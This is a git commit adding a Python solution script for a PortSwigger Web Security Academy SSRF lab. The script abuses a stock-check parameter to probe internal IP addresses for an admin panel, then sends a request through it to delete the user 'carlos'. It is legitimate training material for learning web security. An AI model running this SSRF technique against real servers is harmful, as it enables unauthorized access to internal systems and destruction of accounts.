4b74abce7f294b1da9ba807d7532aa030f705c3c
sm6r <101045970+SajaMatar@users.noreply.github.com>
2024-05-10 23:00:14 +0300

    Create sol.py

---
+++ PortSwigger_Labs/SSRF/Lab: Basic SSRF against another back-end system/sol.py
@@ -0,0 +1,30 @@
+# Created by sm6r, 2024
+# Lab :  https://portswigger.net/web-security/ssrf/lab-basic-ssrf-against-backend-system
+import requests
+import sys
+
+if len(sys.argv) != 2:
+    print("Usage: python sol.py $URL$")
+
+url = sys.argv[1]+"/product/stock"
+
+for i in range(234,236):    
+    stock = f"/http://192.168.0.{i}:8080/admin"
+    resp = requests.post(url,data={"stockApi":stock})
+
+    print(stock,end= "  ")
+    
+    if resp.status_code == 200 :
+        print(" --->  Got the correct one <--- ")
+        newParm = stock+"/delete?username=carlos"
+        res = requests.post(url,data={"stockApi":newParm})
+
+        if(res.status_code == 200):
+            print("[+] carlos is deleted ...")
+        else:
+            print(f"[-] didnt delete carlos, got {res.status_code}")
+
+        break
+    else:
+        print(f"NO,{resp.status_code}")
+
